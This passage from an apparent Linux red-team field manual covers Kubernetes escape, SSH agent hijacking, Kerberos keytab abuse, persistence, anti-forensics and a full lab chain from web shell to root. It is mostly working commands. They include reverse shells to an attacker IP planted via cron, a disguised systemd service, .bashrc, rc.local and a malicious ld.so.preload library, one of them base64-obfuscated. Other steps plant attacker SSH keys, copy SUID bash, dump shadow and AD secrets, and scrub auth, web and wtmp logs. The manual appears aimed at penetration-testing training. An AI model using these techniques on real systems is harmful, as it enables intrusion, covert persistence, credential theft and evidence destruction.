kubectl apply -f /tmp/escape.yaml --token=$KUBE_TOKEN
kubectl exec -it escape-pod -- /bin/bash  # Shell on NODE!

# STEP 4: Access secrets from other namespaces (if SA has permission):
curl -sSk -H "Authorization: Bearer $KUBE_TOKEN" \
  "$KUBE_API/api/v1/secrets" | python3 -m json.tool | \
  grep -A3 '"type": "kubernetes.io/service-account-token"'
# May reveal tokens for other service accounts including admin!

# STEP 5: RBAC enumeration (using kubectl if available):
kubectl auth can-i --list --token=$KUBE_TOKEN
# Shows all permissions your SA has across the cluster
```

---

# PART 6 — LATERAL MOVEMENT FROM LINUX

---

## 29. SSH Agent Hijacking

```bash
# SSH agent stores decrypted private keys in memory
# If an agent is running and its socket is accessible: use their keys!

# Find running SSH agents:
ps aux | grep ssh-agent
find /tmp -name "ssh-*" -type d 2>/dev/null    # Agent socket directory
# Expected:
# /tmp/ssh-XXXXXXXXXXXX/agent.12345

# If you can access the socket (same user, root, or world-writable):
export SSH_AUTH_SOCK=/tmp/ssh-XXXXXXXXXXXX/agent.12345
ssh-add -l    # List loaded keys
# Expected:
# 4096 SHA256:abc123... /home/alice/.ssh/id_rsa (RSA)  ← alice's key loaded!

# Connect to remote hosts using alice's key:
ssh -A alice@10.10.10.200    # -A = forward agent
# Or directly:
ssh root@10.10.10.1   # Uses alice's agent directly!

# If running as root — hijack ANY user's agent:
# Find all agent sockets:
find /tmp /run/user -name "agent.*" 2>/dev/null | head
# Use any of them:
SSH_AUTH_SOCK=/tmp/ssh-xxx/agent.1234 ssh-add -l
SSH_AUTH_SOCK=/tmp/ssh-xxx/agent.1234 ssh user@target
```

---

## 30. Kerberos from Linux — Linux in AD Environments

```bash
# Linux machines joined to AD → Kerberos tickets available!

# Check if machine is domain-joined:
realm list 2>/dev/null
cat /etc/krb5.conf 2>/dev/null
# Expected:
# [libdefaults]
#   default_realm = CORP.LOCAL
#   kdc = dc01.corp.local

# List cached tickets:
klist 2>/dev/null
# Expected:
# Ticket cache: FILE:/tmp/krb5cc_1000
# Default principal: alice@CORP.LOCAL
# Valid starting  Expires         Service principal
# 01/16 03:14:00  01/16 13:14:00  krbtgt/CORP.LOCAL@CORP.LOCAL

# Use existing ticket for AD enumeration:
ldapsearch -Y GSSAPI -H ldap://dc01.corp.local \
  -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName

# Extract ticket from keytab (service account keys on AD-joined Linux):
find / -name "*.keytab" 2>/dev/null
# Expected:
# /etc/krb5.keytab  ← System keytab! Contains machine account hash!

# Convert keytab to hashcat format:
python3 keytabextract.py /etc/krb5.keytab
# Crack the hash → machine account password

# Or: use keytab for further Kerberos authentication:
kinit -k -t /etc/krb5.keytab MACHINE\$@CORP.LOCAL
klist  # Now have machine account ticket

# Impacket with GSSAPI/Kerberos (from cached tickets):
export KRB5CCNAME=/tmp/krb5cc_1000
impacket-smbclient -k -no-pass dc01.corp.local
impacket-secretsdump -k -no-pass CORP/alice@dc01.corp.local
```

---

# PART 7 — PERSISTENCE ON LINUX

---

## 31. Linux Persistence Mechanisms

```bash
# ══════════════════════════════════════════════════════════════════
# PERSISTENCE MECHANISMS (stealthy to noisy)
# ══════════════════════════════════════════════════════════════════

# ── 1. SSH AUTHORIZED KEYS (most stealthy, very common) ──────────
# Add our key to root's authorized_keys:
mkdir -p /root/.ssh && chmod 700 /root/.ssh
echo "ssh-ed25519 AAAA... attacker-key" >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
# Re-enter: ssh -i attacker_key root@target

# Also add to all user home dirs (belt and suspenders):
for user in $(ls /home/); do
  mkdir -p /home/$user/.ssh
  echo "ssh-ed25519 AAAA... attacker-key" >> /home/$user/.ssh/authorized_keys
  chmod 700 /home/$user/.ssh
  chmod 600 /home/$user/.ssh/authorized_keys
  chown -R $user:$user /home/$user/.ssh
done

# ── 2. CRON JOB (reliable, survives reboots) ─────────────────────
# Add root cron for reverse shell (every minute):
echo "* * * * * root bash -i >& /dev/tcp/10.10.10.50/4444 0>&1" \
  > /etc/cron.d/cleanup
# Every minute → shell connects back
# Hard to detect if cron.d file is named something benign

# Per-user crontab (as current user):
(crontab -l 2>/dev/null; echo "*/5 * * * * /tmp/.hidden_shell.sh") | crontab -

# ── 3. SYSTEMD SERVICE (survives reboots, runs as root) ──────────
cat > /etc/systemd/system/systemd-update.service << 'EOF'
[Unit]
Description=System Update Helper
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'while true; do bash -i >& /dev/tcp/10.10.10.50/4444 0>&1; sleep 60; done'
Restart=always
RestartSec=30

[Install]
WantedBy=multi-user.target
EOF

systemctl enable systemd-update.service
systemctl start systemd-update.service
# Reverse shell every minute, auto-starts on boot, looks like system service

# ── 4. BASHRC / PROFILE (user-specific, fires on login) ──────────
echo "bash -i >& /dev/tcp/10.10.10.50/4444 0>&1 &" >> /root/.bashrc
# But: obvious if user looks at their .bashrc

# Less obvious — base64 encode:
echo "KGJhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTAuNTAvNDQ0NCAwPiYxKSAmCg==" | \
  base64 -d >> /root/.bashrc

# ── 5. SUID BASH COPY (quick escalation path) ─────────────────────
cp /bin/bash /tmp/.system_bash
chmod +s /tmp/.system_bash
# Anyone who knows this exists: /tmp/.system_bash -p → root!

# More hidden location:
cp /bin/bash /var/tmp/.bash
chmod +s /var/tmp/.bash
# /var/tmp survives reboots (unlike /tmp which is cleared)

# ── 6. /etc/rc.local (old-school, still works) ───────────────────
echo "bash -i >& /dev/tcp/10.10.10.50/4444 0>&1 &" >> /etc/rc.local
chmod +x /etc/rc.local
# Runs on every boot as root

# ── 7. LD_PRELOAD IN /etc/ld.so.preload ──────────────────────────
# Every program loads this library — put malicious lib there:
cat > /tmp/preload.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
static void init() __attribute__((constructor));
void init() {
    if (getuid() != 0) return;  // Only trigger for root processes
    system("bash -i >& /dev/tcp/10.10.10.50/4444 0>&1");
}
EOF
gcc -fPIC -shared -o /lib/x86_64-linux-gnu/libsecret.so /tmp/preload.c
echo "/lib/x86_64-linux-gnu/libsecret.so" > /etc/ld.so.preload
# Every program that runs as root will trigger this!
```

---

# PART 8 — COVERING TRACKS

---

## 32. Log Manipulation & Anti-Forensics

```bash
# ══════════════════════════════════════════════════════════════════
# WHAT LOGS CAPTURE YOUR ACTIVITY
# ══════════════════════════════════════════════════════════════════

# /var/log/auth.log   → SSH logins, sudo usage, su attempts
# /var/log/syslog     → General system events
# /var/log/apache2/   → Web server access (your web shell commands!)
# /var/log/nginx/     → Nginx access
# /var/log/mysql/     → MySQL queries (your SQL injection!)
# ~/.bash_history     → Every command you typed
# /var/log/lastlog    → Binary: last login per user
# /var/log/wtmp       → Binary: all logins/logouts
# /var/log/btmp       → Binary: failed logins
# /var/log/audit/     → Advanced audit logging (if auditd enabled)
# journalctl          → systemd journal (comprehensive)

# ── BASH HISTORY ──────────────────────────────────────────────────
# Before doing anything sensitive — disable history:
unset HISTFILE                    # Don't save history this session
export HISTSIZE=0                 # Don't keep history in memory
export HISTFILESIZE=0

# Clear existing history:
history -c                        # Clear in-memory history
cat /dev/null > ~/.bash_history   # Truncate history file
# But: empty history is suspicious! Better: delete only your lines

# ── AUTH LOGS ─────────────────────────────────────────────────────
# View what's logged:
grep "$(date +'%b %e')" /var/log/auth.log | grep -E "sshd|sudo" | tail -20

# Remove your IP from auth logs (crude but effective for CTF):
grep -v "192.168.56.50" /var/log/auth.log > /tmp/auth.log.clean
mv /tmp/auth.log.clean /var/log/auth.log

# More surgical — remove your session:
# Find your session lines by timestamp:
grep "Jan 16 03:14" /var/log/auth.log
# Remove those lines only

# ── WEB LOGS ──────────────────────────────────────────────────────
# Your web shell requests appear in access.log:
grep "shell.php\|cmd=\|system\|exec" /var/log/apache2/access.log
# Remove them:
grep -v "shell.php\|cmd=" /var/log/apache2/access.log > /tmp/access.clean
mv /tmp/access.clean /var/log/apache2/access.log

# ── BINARY LOGS (lastlog, wtmp, btmp) ─────────────────────────────
# These are binary files — can't just grep/sed them
# Tool: utmpdump (converts binary to text, edit, convert back)
utmpdump /var/log/wtmp | grep -v "192.168.56.50" | utmpdump -r > /tmp/wtmp.clean
mv /tmp/wtmp.clean /var/log/wtmp

# ── TIMESTAMPS (FILE MODIFICATION TIMES) ─────────────────────────
# When you create/modify files, timestamps are updated
# touch -t changes atime and mtime to match another file:
touch -r /etc/passwd /tmp/malicious_script.sh  # Copy timestamp from passwd

# Or set a specific time:
touch -t 202312150900 /tmp/malicious_script.sh  # Dec 15, 2023, 09:00

# ── DISK DELETION ─────────────────────────────────────────────────
# Normal rm leaves data recoverable — use shred:
shred -u /tmp/loot.txt   # Overwrite then delete
shred -zun 3 /tmp/linpeas.sh  # 3-pass overwrite + zero fill + delete

# ── COVER TRACK OPSEC RULES ───────────────────────────────────────
# 1. Set HISTFILE=/dev/null BEFORE running any commands
# 2. Clean logs in reverse order (most specific first)
# 3. Don't completely empty logs — suspicious
# 4. Restore file timestamps after modification
# 5. On real engagements: document what you cleaned for client report
# 6. Some logs are forwarded to SIEM in real-time — local deletion too late!
# 7. If auditd is running: /var/log/audit/audit.log captures EVERYTHING
#    including file reads, system calls, network connections
#    Very hard to clean without stopping auditd (which itself is logged!)
```

---

# PART 9 — FULL PRIVESC CHAINS

---

## 33. Full Lab: Web Shell → Root Chain

```bash
# ══════════════════════════════════════════════════════════════════
# COMPLETE CHAIN: Web shell → PrivEsc → Root → Persistence
# Target: Ubuntu 20.04 web server (10.10.10.100)
# Starting point: www-data shell via file upload vulnerability
# ══════════════════════════════════════════════════════════════════

# LAB TOPOLOGY:
# ┌──────────────────────────────────────────────────────────────────┐
# │  Kali (10.10.10.50)    ←→    Target Ubuntu (10.10.10.100)       │
# │                               Apache2 + PHP + MySQL              │
# │                               www-data web shell via upload      │
# │                               alice (UID 1001, has sudo vim)     │
# │                               Writable cron script runs as root  │
# └──────────────────────────────────────────────────────────────────┘

# ── PHASE 1: STABILIZE SHELL ─────────────────────────────────────
# You have: nc -lvnp 4444 receiving a raw www-data shell

# Stabilize:
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm; stty rows 50 cols 200

# ── PHASE 2: FIRST 60 SECONDS ─────────────────────────────────────
id
# uid=33(www-data) gid=33(www-data) groups=33(www-data)

sudo -l
# (root) NOPASSWD: /usr/bin/vim   ← JACKPOT! Instant privesc path!
# But let's explore more for a real engagement...

uname -r
# 5.4.0-150-generic  ← Check DirtyPipe, PwnKit

cat /etc/passwd | grep -v nologin
# alice:x:1001:1001::/home/alice:/bin/bash

# ── PHASE 3: CREDENTIAL HUNTING ───────────────────────────────────
# Find DB creds for website:
find /var/www -name "*.php" | xargs grep -l "mysqli\|PDO\|database" 2>/dev/null | head
cat /var/www/html/config.php
# Expected:
# $db_host = 'localhost';
# $db_user = 'webapp';
# $db_pass = 'WebAppDB@2024!';
# $db_name = 'webapp_db';

# Connect to MySQL with found credentials:
mysql -u webapp -p'WebAppDB@2024!' webapp_db -e "SELECT * FROM users;"
# Expected:
# admin | 5f4dcc3b5aa765d61d8327deb882cf99 (MD5: password)
# alice | e10adc3949ba59abbe56e057f20f883e (MD5: 123456)
# alice's actual system password might be reused!

# Try alice's password on her account:
su - alice    # Password: 123456
# Expected: alice shell!

# ── PHASE 4: PRIVESC AS ALICE ─────────────────────────────────────
sudo -l  # As alice
# (root) NOPASSWD: /usr/bin/vim   ← alice has sudo vim!

# Privilege escalate via vim:
sudo vim -c ':!/bin/bash'
# Expected: root@target:/home/alice#
id
# uid=0(root) gid=0(root) groups=0(root)

# ── PHASE 5: POST-EXPLOITATION ────────────────────────────────────
# Add SSH key for persistent access:
mkdir -p /root/.ssh
echo "ssh-ed25519 AAAA... your-public-key" >> /root/.ssh/authorized_keys

# Dump all credentials:
cat /etc/shadow
# Expected:
# root:$6$rounds=5000$salt$HASH:::
# alice:$6$rounds=5000$salt2$HASH2:::

# Crack:
# hashcat -m 1800 shadow_hashes.txt rockyou.txt

# Check for other interesting things:
cat /etc/hosts        # Other internal hosts?
ip route              # Internal network routes?
# Expected:
# 192.168.10.0/24 via 10.10.10.1  ← Internal network accessible!

# Network scan from here:
# (if nmap isn't installed, use bash port scanning):
for port in 22 80 443 445 3389 8080; do
  (echo >/dev/tcp/192.168.10.10/$port) &>/dev/null && \
  echo "192.168.10.10:$port OPEN"
done 2>/dev/null

# ── PHASE 6: SET UP PIVOT ─────────────────────────────────────────
# SSH tunnel to access internal 192.168.10.0/24 from Kali:
ssh -i attacker_key -D 1080 -N root@10.10.10.100 &
# Now: proxychains4 nmap -sT 192.168.10.0/24

# ── PHASE 7: CLEAN UP ──────────────────────────────────────────────
# Remove web shell:
rm /var/www/html/shell.php

# Clear relevant log lines:
# (Be surgical — remove your IP and timestamp ranges only)
grep -v "10.10.10.50\|shell.php" /var/log/apache2/access.log > /tmp/a.log
mv /tmp/a.log /var/log/apache2/access.log

# Set HISTFILE to /dev/null for this session:
# (Should have done at start!)
history -c
```

---

## PrivEsc Decision Tree

```
┌──────────────────────────────────────────────────────────────────────┐
│                  LINUX PRIVESC DECISION TREE                        │
├──────────────────────────────────────────────────────────────────────┤
│                                                                      │
│  START: You have low-priv shell                                      │
│                    │                                                 │
│                    ▼                                                 │
│  sudo -l ──────► Any sudo entry? ──YES──► GTFOBins → instant root   │
│                    │ NO                                              │
│                    ▼                                                 │
│  groups ───────► docker/lxd/disk? ─YES──► Section 15/16 → root     │
│                    │ NO                                              │
│                    ▼                                                 │
│  find SUID ────► Exploitable SUID? YES──► GTFOBins → instant root   │
│                    │ NO                                              │
│                    ▼                                                 │
│  cat /etc/crontab → Root cron job? ──YES──► Writable script? → root │
│                    │ NO                                              │
│                    ▼                                                 │
│  getcap -r / ──► cap_setuid set? ──YES──► Section 11 → root         │
│                    │ NO                                              │
│                    ▼                                                 │
│  cat /etc/passwd → Writable? ─────YES──► Section 19 → root          │
│                    │ NO                                              │
│                    ▼                                                 │
│  Credential hunt → Creds for other user? YES──► su/ssh → privesc?   │
│                    │ NO                                              │
│                    ▼                                                 │
│  uname -r ─────► Vulnerable kernel? YES──► DirtyPipe/PwnKit → root  │
│                    │ NO                                              │
│                    ▼                                                 │
│  pspy ─────────► Root running writable script? YES──► Hijack → root │
│                    │ NO                                              │
│                    ▼                                                 │
│  Run LinPEAS ──► Check RED/YELLOW findings → iterate above vectors  │
└──────────────────────────────────────────────────────────────────────┘
```

---

*Cross-references:*
- *Initial shell via web: `Web_Application_Security_RedTeam_Field_Manual.md` Sections 13, 27*
- *SSH port and tunneling: `Ports_Protocols_RedTeam_Field_Manual.md` Section 5*
- *Linux in AD environments: `Active_Directory_RedTeam_Field_Manual.md` Section 30*
- *Container escape (cloud context): `Cloud_Networking_Sections_18_to_36.md` Section 20*

*Tools: LinPEAS, pspy, GTFOBins, linux-exploit-suggester-2, linenum, lse.sh,*
*socat, chisel, ligolo-ng, Mimikatz-for-Linux, pypykatz, secretsdump, firefox_decrypt*

*Labs: TryHackMe Linux PrivEsc (free), HackTheBox Linux easy/medium machines,*
*PG Practice (rootme, loly, potato), OSCP prep machines (Linux PrivEsc focus),*
*OverTheWire: Bandit (for fundamentals), VulnHub: Kioptrix series*